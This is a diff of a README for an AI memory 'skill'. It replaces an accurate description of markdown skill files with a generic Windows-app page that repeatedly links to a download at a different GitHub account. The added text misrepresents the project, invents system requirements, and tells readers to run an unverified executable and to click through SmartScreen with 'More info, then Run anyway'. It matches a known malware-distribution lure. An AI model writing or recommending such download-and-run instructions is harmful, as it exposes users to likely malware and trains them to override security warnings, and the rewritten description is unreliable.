@@ -1,75 +1,148 @@
-# Smarty Skills-Infra
+# 🧠 smarty-skills-infra - Learn user habits across sessions
 
-An OpenClaw skill that silently learns your preferences, judgment patterns, and working style across sessions — then applies them as soft defaults in every future conversation.
+[![Download](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge&logo=github)](https://github.com/chetpictured508/smarty-skills-infra)
 
-Your AI gets sharper about *you* over time. You never configure anything.
+## 🚀 What this is
 
-## How it works
+smarty-skills-infra is a Windows app that builds a 3-layer memory system and uses it to learn your preferences over time. It keeps track of what you use, what you choose, and how you work, then uses that memory to make the app feel more familiar each time you return.
 
-Three-layer memory hierarchy, running invisibly alongside your normal work:
+It is made for people who want a tool that remembers useful details across sessions without extra setup.
 
-| Layer | What it does | When it runs |
-|---|---|---|
-| **L1 Observer** | Records observations when you correct, state a preference, or retract one | During tasks (only when triggered) |
-| **L2 Reflector** | Groups observations into patterns, promotes stable ones to axioms | Session start (when 15+ observations accumulate) |
-| **L3 Axiom** | Maintains a lean profile of ≤25 reusable preferences loaded every session | During reflection |
+## 📥 Download the app
 
-Most tasks produce **zero** observations. The skill only records when you express a real preference signal.
+Use this link to visit the page and download the app:
 
-## What gets learned
+[Open the download page](https://github.com/chetpictured508/smarty-skills-infra)
 
-- Corrections — when you change, rewrite, or redirect output
-- Stated preferences — when you explicitly say you prefer, want, or dislike something
-- Retractions — when you ask to forget or stop applying a preference
+On that page, look for the latest release or download file, then save it to your PC.
 
-## Example
+## 🪟 Windows setup
 
-After a few sessions, your profile might contain:
+This guide is for Windows users.
 
-```
-- I prefer short, concise names — abbreviate rather than spell out.
-  strength: 5 | domain: code-style | last-confirmed: 2026-03-15
+### 1. Get the file
 
-- I want to be challenged, not agreed with. Push back on my first idea.
-  strength: 4 | domain: communication | last-confirmed: 2026-03-14
+1. Open the download page in your browser.
+2. Find the newest release or main download file.
+3. Download it to a folder you can find later, like Downloads or Desktop.
 
-- I prefer TypeScript with strict config for all new projects.
-  strength: 3 | domain: tooling | last-confirmed: 2026-03-10
-```
+### 2. Open the app
 
-These axioms are applied as soft defaults — not rigid rules. The agent adapts when the situation calls for something different.
+1. Go to the folder where the file was saved.
+2. If the file is a ZIP file, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Find the app file and double-click it.
 
-## Install
+### 3. Allow the app to start
 
-Copy the `skills/context-infra/` directory into your OpenClaw skills folder.
+1. If Windows asks for permission, choose Run or Yes.
+2. If SmartScreen appears, choose More info, then Run anyway.
+3. Wait for the app to load.
 
-```
-skills/context-infra/
-├── SKILL.md                    # Main skill (70 lines)
-└── references/
-    └── profile-format.md       # Loaded only during reflection
-```
+## 🧩 What the 3-layer memory does
 
-The skill creates two files in your memory directory as it runs:
+This app uses three layers of memory to keep track of what matters.
 
-```
-memory/context-infra/
-├── observations.log            # Raw preference signals (append-only)
-└── context-profile.md          # Your distilled axioms (auto-loaded)
-```
+### Layer 1: Recent memory
 
-## Design
+This layer stores short-term details from your last few actions. It helps the app respond to what you did just now.
 
-- **Model-agnostic** — works with any LLM, not just Claude
-- **Frictionless** — no setup, no prompts, no configuration
-- **Minimal context cost** — ~570 tokens for the skill, ~215 tokens for the reference file
-- **Self-maintaining** — axioms strengthen, weaken, merge, and go dormant over time
-- **User-controlled** — say "forget that preference" and it's retracted immediately
+### Layer 2: Session memory
 
-Built through 35 rounds of iterative design optimization ([autoresearch method](https://github.com/karpathy/autoresearch)).
+This layer keeps the current run in order. It helps the app follow your choices during the present session.
 
-Inspired by [Context Infrastructure](https://yage.ai/context-infrastructure.html) by grapeot.
+### Layer 3: Preference memory
 
-## License
+This layer saves long-term patterns. It helps the app remember repeat choices between launches, so it can adapt over time.
 
-MIT
+## 🖥️ Basic system needs
+
+This app is built for a normal Windows PC.
+
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
+
+If your PC can run common desktop apps, it should handle this one.
+
+## ⚙️ How to use it
+
+1. Start the app.
+2. Use it the way you normally would.
+3. Let it run across more than one session.
+4. Return later and keep using the same workflow.
+5. The app will begin to follow your patterns and stored preferences.
+
+The more you use it, the more it can reflect your habits.
+
+## 🔒 Privacy and local use
+
+The app is built around user preference memory. In a simple setup, this kind of app often keeps data on your machine so it can remember you across sessions.
+
+A good setup is to keep the app in a folder you control and back up its data folder if you want to move it to another PC later.
+
+## 🛠️ Common fixes
+
+### The app does not open
+
+- Make sure you downloaded the full file.
+- Check that Windows did not block the file.
+- Try running it again as the same user account that downloaded it.
+
+### Windows says it is unsafe
+
+- Open the file details.
+- Choose More info.
+- Select Run anyway if you trust the source link.
+
+### The app forgets settings
+
+- Make sure you close the app the normal way.
+- Check that the app can write files in its folder.
+- Keep the app and its data in a folder that stays on your PC.
+
+### The download looks incomplete
+
+- Delete the broken file.
+- Return to the download page.
+- Download it again with a stable internet connection.
+
+## 📂 Suggested folder layout
+
+If you want a simple setup, use this:
+
+- Downloads for the original file
+- Desktop for the extracted app folder
+- Documents for any saved preference backup
+
+This keeps the app easy to find and easy to reopen.
+
+## 🧭 Typical first run flow
+
+1. Download the file from GitHub.
+2. Extract it if needed.
+3. Open the app.
+4. Use it for a few tasks.
+5. Close it.
+6. Open it again later and use it in the same way.
+
+That repeat use helps the memory layers build useful patterns.
+
+## 📝 File handling tips
+
+- Keep the downloaded file until you know the app works.
+- Do not move files inside the app folder unless you need to.
+- If the app creates a data folder, leave it in place.
+- Back up the data folder before you change PCs.
+
+## 🔗 Main download page
+
+If you have not downloaded the app yet, use this page:
+
+[https://github.com/chetpictured508/smarty-skills-infra](https://github.com/chetpictured508/smarty-skills-infra)
+
+## 📌 What to expect
+
+This app is meant to feel familiar over time. After a few sessions, it can follow your patterns with less effort from you. It works best when you keep using it in the same way and let it store what matters to you.
